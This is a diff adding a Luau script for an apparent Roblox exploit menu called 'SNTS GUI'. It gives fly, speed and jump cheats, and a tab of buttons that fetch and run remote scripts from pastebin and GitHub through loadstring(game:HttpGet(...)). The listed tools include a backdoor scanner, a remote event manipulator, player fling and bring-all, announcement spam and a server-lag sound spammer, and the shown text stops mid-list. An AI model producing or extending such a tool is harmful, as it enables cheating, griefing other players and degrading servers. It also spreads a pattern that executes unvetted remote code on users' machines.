@@ -1,0 +1,1081 @@
+local players = game:GetService("Players")
+local userInputService = game:GetService("UserInputService")
+local runService = game:GetService("RunService")
+
+local function f1(p1, p2)
+  local character = p2.Character
+
+  if not character then
+    p2.CharacterAdded:Wait()
+    character = p2.Character
+  end
+
+  local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+  local humanoid = character:WaitForChild("Humanoid")
+  local v1 = false
+  local v2 = false
+  local v3 = false
+  local walkSpeed = humanoid.WalkSpeed
+  local jumpPower = humanoid.JumpPower
+  local v4 = { Fly = Enum.KeyCode.F, Speed = Enum.KeyCode.G, Jump = Enum.KeyCode.J }
+  local v5 = { Fly = p1.fly.keyLabel, Speed = p1.speed.keyLabel, Jump = p1.jump.keyLabel }
+
+  for key, value in pairs(v5) do
+    value.Text = v4[key].Name
+  end
+
+  local bodyGyro, bodyVelocity, connect, connect2, connect3
+
+  local function f2()
+    if v1 then
+      return
+    end
+
+    v1 = true
+    p1.fly.frame.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    bodyGyro = Instance.new("BodyGyro")
+    bodyVelocity = Instance.new("BodyVelocity")
+    bodyGyro.MaxTorque = Vector3.new(100000, 100000, 100000)
+    bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
+    bodyGyro.P = 90000
+    bodyVelocity.P = 90000
+    bodyGyro.Parent = humanoidRootPart
+    bodyVelocity.Parent = humanoidRootPart
+    humanoid.PlatformStand = true
+
+    local v6 = {
+      F = 0,
+      B = 0,
+      L = 0,
+      R = 0,
+      U = 0,
+      D = 0,
+    }
+
+    local f3
+
+    function f3(p3, p4)
+      local v7 = p4 and 1 or 0
+
+      if p3.KeyCode == Enum.KeyCode.W then
+        v6.F = v7
+      end
+
+      if p3.KeyCode == Enum.KeyCode.S then
+        v6.B = -v7
+      end
+
+      if p3.KeyCode == Enum.KeyCode.A then
+        v6.L = -v7
+      end
+
+      if p3.KeyCode == Enum.KeyCode.D then
+        v6.R = v7
+      end
+
+      if p3.KeyCode == Enum.KeyCode.Space then
+        v6.U = v7
+      end
+
+      if p3.KeyCode == Enum.KeyCode.LeftControl then
+        v6.D = -v7
+      end
+    end
+
+    connect2 = userInputService.InputBegan:Connect(function(input) f3(input, true) end)
+    connect3 = userInputService.InputEnded:Connect(function(input2) f3(input2, false) end)
+
+    connect = runService.Heartbeat:Connect(function()
+      if not v1 then
+        return
+      else
+        bodyGyro.CFrame = workspace.CurrentCamera.CFrame
+
+        local v8 = workspace.CurrentCamera.CFrame.LookVector * (v6.F + v6.B)
+          + workspace.CurrentCamera.CFrame.RightVector * (v6.R + v6.L)
+          + Vector3.new(0, v6.U + v6.D, 0)
+
+        if v8.Magnitude > 0 then
+          bodyVelocity.Velocity = v8.Unit * 80
+        else
+          bodyVelocity.Velocity = Vector3.zero
+        end
+
+        return
+      end
+    end)
+  end
+
+  local function f4()
+    if not v1 then
+      return
+    end
+
+    v1 = false
+    p1.fly.frame.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+
+    if connect then
+      connect:Disconnect()
+    end
+
+    if connect2 then
+      connect2:Disconnect()
+    end
+
+    if connect3 then
+      connect3:Disconnect()
+    end
+
+    if bodyGyro then
+      bodyGyro:Destroy()
+    end
+
+    if bodyVelocity then
+      bodyVelocity:Destroy()
+    end
+
+    humanoid.PlatformStand = false
+  end
+
+  local function f5()
+    v2 = not v2
+
+    local frame = p1.speed.frame
+    frame.BackgroundColor3 = v2 and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(22, 22, 22)
+
+    humanoid.WalkSpeed = v2 and 80 or walkSpeed
+  end
+
+  local function f6()
+    v3 = not v3
+
+    local frame2 = p1.jump.frame
+    frame2.BackgroundColor3 = v3 and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(22, 22, 22)
+
+    humanoid.JumpPower = v3 and 150 or jumpPower
+  end
+
+  local function f7(parent, p5)
+    local textButton = Instance.new("TextButton")
+    textButton.Size = UDim2.new(1, 0, 1, 0)
+    textButton.BackgroundTransparency = 1
+    textButton.Text = ""
+    textButton.Parent = parent
+    textButton.MouseButton1Click:Connect(p5)
+  end
+
+  f7(p1.fly.frame, function()
+    if v1 then
+      f4()
+    else
+      f2()
+    end
+  end)
+
+  f7(p1.speed.frame, f5)
+  f7(p1.jump.frame, f6)
+
+  local function f8(p6, p7)
+    local textButton2 = Instance.new("TextButton")
+    textButton2.Size = UDim2.new(1, 0, 1, 0)
+    textButton2.BackgroundTransparency = 1
+    textButton2.Text = ""
+    textButton2.Parent = p7.Parent.Parent
+
+    textButton2.MouseButton1Click:Connect(function()
+      p7.Text = "..."
+      local connect4
+
+      connect4 = userInputService.InputBegan:Connect(function(input3, p8)
+        if p8 then
+          return
+        else
+          local keyCode = input3.KeyCode
+
+          if keyCode ~= Enum.KeyCode.Unknown then
+            v4[p6] = keyCode
+            p7.Text = keyCode.Name
+
+            if connect4 then
+              connect4:Disconnect()
+            end
+          end
+
+          return
+        end
+      end)
+    end)
+  end
+
+  f8("Fly", v5.Fly)
+  f8("Speed", v5.Speed)
+  f8("Jump", v5.Jump)
+
+  userInputService.InputBegan:Connect(function(input4, p9)
+    if p9 then
+      return
+    end
+
+    if input4.KeyCode == v4.Fly then
+      if v1 then
+        f4()
+      else
+        f2()
+      end
+    elseif input4.KeyCode == v4.Speed then
+      f5()
+    elseif input4.KeyCode == v4.Jump then
+      f6()
+    end
+  end)
+
+  return { stopFly = f4, toggleSpeed = f5, toggleJump = f6 }
+end
+
+local v9 = game
+
+local function f9(p10)
+  if not pcall(function() loadstring(game:HttpGet(p10))() end) then
+    warn("[SNTS GUI] Failed to execute: " .. p10)
+  end
+end
+
+local function f10(p11, p12)
+  for index, value2 in ipairs(p11:GetChildren()) do
+    if not value2:IsA("UIListLayout") and not value2:IsA("UIPadding") then
+      value2:Destroy()
+    end
+  end
+
+  p11.CanvasSize = UDim2.new(0, 0, 0, p12.AbsoluteContentSize.Y + 12)
+end
+
+local function f11()
+  local localPlayer = players.LocalPlayer
+  local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+  local robloxGui = Instance.new("ScreenGui")
+  robloxGui.Name = "RobloxGui"
+  robloxGui.ResetOnSpawn = false
+  robloxGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+  robloxGui.Parent = playerGui
+
+  local mainFrame = Instance.new("Frame")
+  mainFrame.Name = "MainFrame"
+  mainFrame.BorderSizePixel = 0
+  mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+  mainFrame.Size = UDim2.new(0.41215, 0, 0.43545, 0)
+  mainFrame.Position = UDim2.new(0.29332, 0, 0.28756, 0)
+  mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  mainFrame.Parent = robloxGui
+
+  local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+  uiAspectRatioConstraint.AspectRatio = 1.7
+  uiAspectRatioConstraint.Parent = mainFrame
+
+  local uiCorner = Instance.new("UICorner")
+  uiCorner.CornerRadius = UDim.new(0, 3)
+  uiCorner.Parent = mainFrame
+
+  local uiStroke = Instance.new("UIStroke")
+  uiStroke.Transparency = 0.64
+  uiStroke.Parent = mainFrame
+
+  local logo = Instance.new("ImageLabel")
+  logo.Name = "Logo"
+  logo.BorderSizePixel = 0
+  logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  logo.Image = "rbxassetid://116741362859655"
+  logo.Size = UDim2.new(0.28064, 0, 0.14286, 0)
+  logo.Position = UDim2.new(0, 0, 0, 0)
+  logo.BackgroundTransparency = 1
+  logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  logo.Parent = mainFrame
+
+  local line1 = Instance.new("Frame")
+  line1.Name = "line1"
+  line1.BorderSizePixel = 0
+  line1.BackgroundColor3 = Color3.fromRGB(35, 35, 36)
+  line1.Size = UDim2.new(0.00317, 0, 0.94609, 0)
+  line1.Position = UDim2.new(0.28064, 0, 0.02965, 0)
+  line1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  line1.Parent = mainFrame
+
+  local line2 = Instance.new("Frame")
+  line2.Name = "line2"
+  line2.BorderSizePixel = 0
+  line2.BackgroundColor3 = Color3.fromRGB(35, 35, 36)
+  line2.Size = UDim2.new(0.95925, 0, 0.00539, 0)
+  line2.Position = UDim2.new(0.02537, 0, 0.14286, 0)
+  line2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  line2.Parent = mainFrame
+
+  local profile = Instance.new("Frame")
+  profile.Name = "Profile"
+  profile.BorderSizePixel = 0
+  profile.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  profile.Size = UDim2.new(0.44871, 0, 0.65768, 0)
+  profile.Position = UDim2.new(0.11406, 0, 0.03179, 0)
+  profile.BackgroundTransparency = 1
+  profile.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  profile.Parent = mainFrame
+
+  local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
+  uiAspectRatioConstraint2.AspectRatio = 1.15
+  uiAspectRatioConstraint2.Parent = profile
+
+  local profilePictureFrame = Instance.new("ImageLabel")
+  profilePictureFrame.Name = "ProfilePictureFrame"
+  profilePictureFrame.BorderSizePixel = 0
+  profilePictureFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  profilePictureFrame.Image = "rbxassetid://82720704511181"
+  profilePictureFrame.Size = UDim2.new(0.42756, 0, 0.4918, 0)
+  profilePictureFrame.Position = UDim2.new(-0.14774, 0, 0.21906, 0)
+  profilePictureFrame.BackgroundTransparency = 1
+  profilePictureFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  profilePictureFrame.Parent = profile
+
+  local uiCorner2 = Instance.new("UICorner")
+  uiCorner2.CornerRadius = UDim.new(0, 100)
+  uiCorner2.Parent = profilePictureFrame
+
+  local avatarImage = Instance.new("ImageLabel")
+  avatarImage.Name = "AvatarImage"
+  avatarImage.BorderSizePixel = 0
+  avatarImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  avatarImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+  avatarImage.Size = UDim2.new(0.34982, 0, 0.40799, 0)
+  avatarImage.Position = UDim2.new(-0.10887, 0, 0.26414, 0)
+  avatarImage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  avatarImage.Parent = profile
+
+  local uiCorner3 = Instance.new("UICorner")
+  uiCorner3.CornerRadius = UDim.new(0, 100)
+  uiCorner3.Parent = avatarImage
+
+  local v10, v11 = pcall(function()
+    return players:GetUserThumbnailAsync(
+      localPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420
+    )
+  end)
+
+  avatarImage.Image = v10 and v11 or "rbxasset://textures/ui/GuiImagePlaceholder.png"
+  avatarImage.ScaleType = Enum.ScaleType.Fit
+
+  local displayNameAndUsername = Instance.new("Frame")
+  displayNameAndUsername.Name = "Display name and username"
+  displayNameAndUsername.BorderSizePixel = 0
+  displayNameAndUsername.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  displayNameAndUsername.Size = UDim2.new(0.12248, 0, 0.08576, 0)
+  displayNameAndUsername.Position = UDim2.new(0.07925, 0, 0.51732, 0)
+  displayNameAndUsername.BackgroundTransparency = 2
+  displayNameAndUsername.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  displayNameAndUsername.Parent = mainFrame
+
+  local displayName = Instance.new("TextLabel")
+  displayName.Name = "DisplayName"
+  displayName.TextWrapped = true
+  displayName.BorderSizePixel = 0
+  displayName.TextSize = 11
+  displayName.TextScaled = true
+  displayName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+  displayName.FontFace = Font.new(
+    "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold
+  )
+
+  displayName.TextColor3 = Color3.fromRGB(208, 208, 208)
+  displayName.BackgroundTransparency = 1
+  displayName.Size = UDim2.new(0.75376, 0, 1.05596, 0)
+  displayName.Position = UDim2.new(0.14872, 0, -0.22077, 0)
+  displayName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  displayName.Text = " " .. localPlayer.DisplayName
+  displayName.Parent = displayNameAndUsername
+
+  local uiTextSizeConstraint = Instance.new("UITextSizeConstraint")
+  uiTextSizeConstraint.MaxTextSize = 11
+  uiTextSizeConstraint.Parent = displayName
+
+  local username = Instance.new("TextLabel")
+  username.Name = "Username"
+  username.TextWrapped = true
+  username.BorderSizePixel = 0
+  username.TextSize = 10
+  username.TextScaled = true
+  username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  username.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
+  username.TextColor3 = Color3.fromRGB(86, 86, 86)
+  username.BackgroundTransparency = 1
+  username.Size = UDim2.new(0.63143, 0, 0.42421, 0)
+  username.Position = UDim2.new(0.20578, 0, 0.60513, 0)
+  username.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  username.Text = "@" .. localPlayer.Name
+  username.Parent = displayNameAndUsername
+
+  local uiTextSizeConstraint2 = Instance.new("UITextSizeConstraint")
+  uiTextSizeConstraint2.MaxTextSize = 10
+  uiTextSizeConstraint2.Parent = username
+
+  localPlayer:GetPropertyChangedSignal("DisplayName"):Connect(function()
+    displayName.Text = " " .. localPlayer.DisplayName
+  end)
+
+  local tabButton = Instance.new("Frame")
+  tabButton.Name = "TabButton"
+  tabButton.BorderSizePixel = 0
+  tabButton.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+  tabButton.Size = UDim2.new(0.67252, 0, 0.11095, 0)
+  tabButton.Position = UDim2.new(0.31527, 0, 0.86267, 0)
+  tabButton.BackgroundTransparency = 1
+  tabButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  tabButton.Parent = mainFrame
+
+  local uiCorner4 = Instance.new("UICorner")
+  uiCorner4.CornerRadius = UDim.new(0, 3)
+  uiCorner4.Parent = tabButton
+
+  local uiAspectRatioConstraint3 = Instance.new("UIAspectRatioConstraint")
+  uiAspectRatioConstraint3.AspectRatio = 10
+  uiAspectRatioConstraint3.Parent = tabButton
+
+  local function f12(name, p13, imageRectOffset)
+    local textButton3 = Instance.new("TextButton")
+    textButton3.Name = name
+    textButton3.BorderSizePixel = 0
+    textButton3.TextSize = 14
+    textButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
+    textButton3.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+
+    textButton3.FontFace = Font.new(
+      "rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular
+    )
+
+    textButton3.BackgroundTransparency = 1
+    textButton3.Size = UDim2.new(0.15, 0, 1, 0)
+    textButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    textButton3.Text = ""
+    textButton3.Parent = tabButton
+
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    imageLabel.Image = "rbxassetid://" .. p13
+    imageLabel.ImageRectSize = Vector2.new(96, 96)
+    imageLabel.Size = UDim2.new(0.6, 0, 0.5, 0)
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.ImageRectOffset = imageRectOffset
+    imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    imageLabel.Parent = textButton3
+
+    local uiAspectRatioConstraint4 = Instance.new("UIAspectRatioConstraint")
+    uiAspectRatioConstraint4.DominantAxis = Enum.DominantAxis.Height
+    uiAspectRatioConstraint4.Parent = imageLabel
+
+    local uiGradient = Instance.new("UIGradient")
+    uiGradient.Rotation = -90
+
+    uiGradient.Color = ColorSequence.new({
+      ColorSequenceKeypoint.new(0, Color3.fromRGB(58, 0, 0)),
+      ColorSequenceKeypoint.new(0.261, Color3.fromRGB(80, 0, 0)),
+      ColorSequenceKeypoint.new(0.618, Color3.fromRGB(120, 0, 0)),
+      ColorSequenceKeypoint.new(0.988, Color3.fromRGB(171, 0, 0)),
+      ColorSequenceKeypoint.new(0.997, Color3.fromRGB(198, 0, 0)),
+      ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
+    })
+
+    uiGradient.Parent = imageLabel
+
+    return textButton3
+  end
+
+  local v12 = f12("Main Script", "8445470559", Vector2.new(404, 104))
+  v12.Position = UDim2.new(0.18812, 0, -0.00575, 0)
+
+  local v13 = f12("Dupe Script", "8445470826", Vector2.new(904, 204))
+  v13.Position = UDim2.new(0.41859, 0, 0, 0)
+
+  local v14 = f12("Player Script", "8445471332", Vector2.new(604, 404))
+  v14.Position = UDim2.new(0.64496, 0, -0.01234, 0)
+
+  local tabName = Instance.new("Frame")
+  tabName.Name = "TabName"
+  tabName.BorderSizePixel = 0
+  tabName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  tabName.Size = UDim2.new(0.17854, 0, 0.03642, 0)
+  tabName.Position = UDim2.new(0.55168, 0, -0.13658, 0)
+  tabName.BackgroundTransparency = 2
+  tabName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  tabName.Parent = mainFrame
+
+  local uiAspectRatioConstraint5 = Instance.new("UIAspectRatioConstraint")
+  uiAspectRatioConstraint5.AspectRatio = 10
+  uiAspectRatioConstraint5.Parent = tabName
+
+  local textLabel = Instance.new("TextLabel")
+  textLabel.TextWrapped = true
+  textLabel.BorderSizePixel = 0
+  textLabel.TextSize = 14
+  textLabel.TextScaled = true
+  textLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+  textLabel.FontFace = Font.new(
+    "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.SemiBold
+  )
+
+  textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+  textLabel.BackgroundTransparency = 1
+  textLabel.Size = UDim2.new(0.79355, 0, 1.78138, 0)
+  textLabel.Position = UDim2.new(-1.326, 0, 5.9535, 0)
+  textLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  textLabel.Text = "TAB NAME"
+  textLabel.Parent = tabName
+
+  local uiTextSizeConstraint3 = Instance.new("UITextSizeConstraint")
+  uiTextSizeConstraint3.MaxTextSize = 14
+  uiTextSizeConstraint3.Parent = textLabel
+
+  local tabScrollingFrame = Instance.new("ScrollingFrame")
+  tabScrollingFrame.Name = "TabScrollingFrame"
+  tabScrollingFrame.Active = true
+  tabScrollingFrame.BorderSizePixel = 0
+  tabScrollingFrame.TopImage = ""
+  tabScrollingFrame.MidImage = ""
+  tabScrollingFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 23)
+  tabScrollingFrame.BackgroundTransparency = 1
+  tabScrollingFrame.BottomImage = ""
+  tabScrollingFrame.Size = UDim2.new(0.66694, 0, 0.66307, 0)
+  tabScrollingFrame.Position = UDim2.new(0.301, 0, 0.1752, 0)
+  tabScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+  tabScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  tabScrollingFrame.ScrollBarThickness = 8
+  tabScrollingFrame.Parent = mainFrame
+
+  local uiListLayout = Instance.new("UIListLayout")
+  uiListLayout.Padding = UDim.new(0, 6)
+  uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+  uiListLayout.Parent = tabScrollingFrame
+
+  local shorcuts = Instance.new("Frame")
+  shorcuts.Name = "Shorcuts"
+  shorcuts.BorderSizePixel = 0
+  shorcuts.BackgroundColor3 = Color3.fromRGB(20, 19, 20)
+  shorcuts.Size = UDim2.new(0.23579, 0, 0.33929, 0)
+  shorcuts.Position = UDim2.new(0.0252, 0, 0.63646, 0)
+  shorcuts.BackgroundTransparency = 1
+  shorcuts.BorderColor3 = Color3.fromRGB(0, 0, 0)
+  shorcuts.Parent = mainFrame
+
+  local function f13(parent2, text, text2, position)
+    local frame3 = Instance.new("Frame")
+    frame3.BorderSizePixel = 0
+    frame3.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+    frame3.Size = UDim2.new(0.6644, 0, 0.23039, 0)
+    frame3.Position = position
+    frame3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    frame3.Parent = parent2
+
+    local uiCorner5 = Instance.new("UICorner")
+    uiCorner5.CornerRadius = UDim.new(0, 3)
+    uiCorner5.Parent = frame3
+
+    local uiAspectRatioConstraint6 = Instance.new("UIAspectRatioConstraint")
+    uiAspectRatioConstraint6.AspectRatio = 3.40708
+    uiAspectRatioConstraint6.Parent = frame3
+
+    local textLabel2 = Instance.new("TextLabel")
+    textLabel2.TextWrapped = true
+    textLabel2.BorderSizePixel = 0
+    textLabel2.TextSize = 14
+    textLabel2.TextScaled = true
+    textLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+    textLabel2.FontFace = Font.new(
+      "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.SemiBold
+    )
+
+    textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel2.BackgroundTransparency = 1
+    textLabel2.Size = UDim2.new(1, 0, 1, 0)
+    textLabel2.Position = UDim2.new(0, 0, -0.03889, 0)
+    textLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel2.Text = text
+    textLabel2.Parent = frame3
+
+    local uiTextSizeConstraint4 = Instance.new("UITextSizeConstraint")
+    uiTextSizeConstraint4.MaxTextSize = 14
+    uiTextSizeConstraint4.Parent = textLabel2
+
+    local toggleKey = Instance.new("Frame")
+    toggleKey.Name = "ToggleKey"
+    toggleKey.BorderSizePixel = 0
+    toggleKey.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+    toggleKey.Size = UDim2.new(0.31128, 0, 1, 0)
+    toggleKey.Position = UDim2.new(1.07085, 0, 0, 0)
+    toggleKey.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    toggleKey.Parent = frame3
+
+    local uiCorner6 = Instance.new("UICorner")
+    uiCorner6.CornerRadius = UDim.new(0, 3)
+    uiCorner6.Parent = toggleKey
+
+    local uiAspectRatioConstraint7 = Instance.new("UIAspectRatioConstraint")
+    uiAspectRatioConstraint7.AspectRatio = 1.06056
+    uiAspectRatioConstraint7.Parent = toggleKey
+
+    local textLabel3 = Instance.new("TextLabel")
+    textLabel3.TextWrapped = true
+    textLabel3.BorderSizePixel = 0
+    textLabel3.TextSize = 14
+    textLabel3.TextScaled = true
+    textLabel3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+    textLabel3.FontFace = Font.new(
+      "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.SemiBold
+    )
+
+    textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel3.BackgroundTransparency = 1
+    textLabel3.Size = UDim2.new(1, 0, 1, 0)
+    textLabel3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel3.Text = text2
+    textLabel3.Parent = toggleKey
+
+    local uiTextSizeConstraint5 = Instance.new("UITextSizeConstraint")
+    uiTextSizeConstraint5.MaxTextSize = 14
+    uiTextSizeConstraint5.Parent = textLabel3
+
+    return frame3, textLabel3
+  end
+
+  local frame4, keyLabel = f13(shorcuts, "Fly", "F", UDim2.new(0.03362, 0, 0.05561, 0))
+  local frame5, keyLabel2 = f13(shorcuts, "Speed", "G", UDim2.new(0.03362, 0, 0.36021, 0))
+  local frame6, keyLabel3 = f13(shorcuts, "Jump", "J", UDim2.new(0.03362, 0, 0.67377, 0))
+
+  return {
+    screenGui = robloxGui,
+    mainFrame = mainFrame,
+    scrollingFrame = tabScrollingFrame,
+    listLayout = uiListLayout,
+    tabNameLabel = textLabel,
+    shortcuts = {
+      fly = { frame = frame4, keyLabel = keyLabel },
+      speed = { frame = frame5, keyLabel = keyLabel2 },
+      jump = { frame = frame6, keyLabel = keyLabel3 },
+    },
+    buttons = { main = v12, dupe = v13, player = v14 },
+  }
+end
+
+v9:GetService("TweenService")
+
+local function f14(p14, p15, p16, p17, p18)
+  local frame7 = Instance.new("Frame")
+  frame7.Size = UDim2.new(1, -10, 0, 55)
+  frame7.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+  frame7.BorderSizePixel = 0
+  frame7.LayoutOrder = 0
+  frame7.Parent = p14
+
+  local uiCorner7 = Instance.new("UICorner")
+  uiCorner7.CornerRadius = UDim.new(0, 6)
+  uiCorner7.Parent = frame7
+
+  local textLabel4 = Instance.new("TextLabel")
+  textLabel4.Size = UDim2.new(1, -90, 1, 0)
+  textLabel4.Position = UDim2.new(0, 15, 0, 0)
+  textLabel4.BackgroundTransparency = 1
+  textLabel4.Text = string.upper(p16) .. "\n" .. p17
+  textLabel4.TextColor3 = Color3.fromRGB(230, 230, 230)
+  textLabel4.Font = Enum.Font.Gotham
+  textLabel4.TextSize = 14
+  textLabel4.TextXAlignment = Enum.TextXAlignment.Left
+  textLabel4.TextYAlignment = Enum.TextYAlignment.Center
+  textLabel4.Parent = frame7
+
+  local textButton4 = Instance.new("TextButton")
+  textButton4.Size = UDim2.new(0, 70, 0, 28)
+  textButton4.Position = UDim2.new(1, -85, 0.5, -14)
+  textButton4.Text = "CLICK"
+  textButton4.TextColor3 = Color3.new(1, 1, 1)
+  textButton4.BackgroundColor3 = Color3.fromRGB(120, 9, 2)
+  textButton4.Font = Enum.Font.GothamBold
+  textButton4.TextSize = 14
+  textButton4.Parent = frame7
+
+  local uiCorner8 = Instance.new("UICorner")
+  uiCorner8.CornerRadius = UDim.new(0, 8)
+  uiCorner8.Parent = textButton4
+
+  textButton4.MouseButton1Click:Connect(function() f9(p18) end)
+  task.defer(function() p14.CanvasSize = UDim2.new(0, 0, 0, p15.AbsoluteContentSize.Y + 12) end)
+  return frame7
+end
+
+local function f15(p19, p20, p21, p22)
+  f10(p19, p20)
+  p21.Text = p22.title
+
+  for index2, value3 in ipairs(p22.items) do
+    f14(p19, p20, value3.title, value3.description, value3.url)
+  end
+end
+
+local v15, v16 = pcall(function()
+  local localPlayer2 = players.LocalPlayer
+  local v17 = f11()
+
+  local listLayout = v17.listLayout
+
+  listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    v17.scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 12)
+  end)
+
+  local v18 = {
+    main = {
+      title = "MAIN SCRIPT",
+      items = {
+        {
+          title = "REMOTE SPY",
+          description = "View and track remote events in-game",
+          url = "https://pastebin.com/raw/z1jKTsmC",
+        },
+        {
+          title = "DEX",
+          description = "Full game explorer with instance editing",
+          url = "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua",
+        },
+        {
+          title = "INFINITE YIELD",
+          description = "Universal admin command hub",
+          url = "https://pastebin.com/raw/EYgEPJjr",
+        },
+        {
+          title = "GUI VIEWER",
+          description = "Universal Gui Viewer",
+          url = "https://pastebin.com/raw/ahNzZ3y6",
+        },
+        {
+          title = "SNTS EXECUTOR",
+          description = "Launches SNTS custom executor core",
+          url = "https://raw.githubusercontent.com/abacada0917/EXE/refs/heads/main/EXE",
+        },
+        {
+          title = "PLAYER STATUS MENU",
+          description = "View and bring players",
+          url = "https://pastebin.com/raw/xZvGE8gM",
+        },
+        {
+          title = "BRING PART",
+          description = "Teleports unanchored parts to the selected username",
+          url = "https://pastebin.com/raw/5xJzUE2K",
+        },
+        {
+          title = "UNANCHORED SCANNER",
+          description = "Detects unanchored parts in workspace",
+          url = "https://pastebin.com/raw/WZHUgZ7f",
+        },
+        {
+          title = "UNANCHORED CONTROLLER",
+          description = "Control and move unanchored objects",
+          url = "https://pastebin.com/raw/HD3ryHi4",
+        },
+        {
+          title = "PBB ANNOUNCEMENT SPAM",
+          description = "Spam Announcement",
+          url = "https://pastebin.com/raw/d9JN6by5",
+        },
+        {
+          title = "ADMIN COMMAND",
+          description = "Run admin commands like kick, tp, and fly",
+          url = "https://pastebin.com/raw/xAs1GMFa",
+        },
+        {
+          title = "BACKDOOR SCANNER",
+          description = "Scans for exploitable backdoors in-game",
+          url = "https://raw.githubusercontent.com/abacada0917/LIKOD-NG-PINTUAN/refs/heads/main/LIKOD%20NG%20PINTUAN",
+        },
+        {
+          title = "DROP CASH",
+          description = "Drops your cash or game money on the ground",
+          url = "https://raw.githubusercontent.com/abacada0917/DROP/refs/heads/main/DROP",
+        },
+        {
+          title = "REMOTE EVENT MANIPULATOR",
+          description = "Intercept and trigger remote events manually",
+          url = "https://pastebin.com/raw/dG4rWzTe",
+        },
+        {
+          title = "TOUCH FLING",
+          description = "Apply a physics-based fling to other players by touching them",
+          url = "https://pastebin.com/raw/69E0fh83",
+        },
+        {
+          title = "LOOPBRING ALL",
+          description = "Continuously bring all players to your position (looped bring)",
+          url = "https://raw.githubusercontent.com/abacada0917/HILA/refs/heads/main/HILA",
+        },
+        {
+          title = "CARRY EXPLOIT MENU",
+          description = "Open a menu of carry-related exploits and utilities",
+          url = "https://pastebin.com/raw/f5gnwPdp",
+        },
+        {
+          title = "CARRY ALL",
+          description = "Grab and carry all nearby players simultaneously",
+          url = "https://pastebin.com/raw/jEuqztSn",
+        },
+        {
+          title = "UNIVERSAL AUTO LOOT",
+          description = "Set proximityprompt hold duration into 0",
+          url = "https://pastebin.com/raw/zkCQ599s",
+        },
+        {
+          title = "UNIVERSAL AUTO FARM",
+          description = "Universal farming for supported games",
+          url = "https://pastebin.com/raw/nGGYBcFP",
+        },
+        {
+          title = "MUSIC EXPLOIT",
+          description = "Play any song ID globally",
+          url = "https://pastebin.com/raw/8NNxkxeX",
+        },
+        {
+          title = "SPAM MUSIC EXPLOIT",
+          description = "Spam multiple sound IDs for fun",
+          url = "https://pastebin.com/raw/wPBK6PmY",
+        },
+        {
+          title = "SOUND LAG",
+          description = "Lag servers using repeated sound spam",
+          url = "https://pastebin.com/raw/BD2G7TC0",
+        },
+        {
+          title = "UNIVERSAL AUTO FARM",
+          description = "Universal farming automation",
+          url = "https://pastebin.com/raw/4TL9xkFB",
+        },
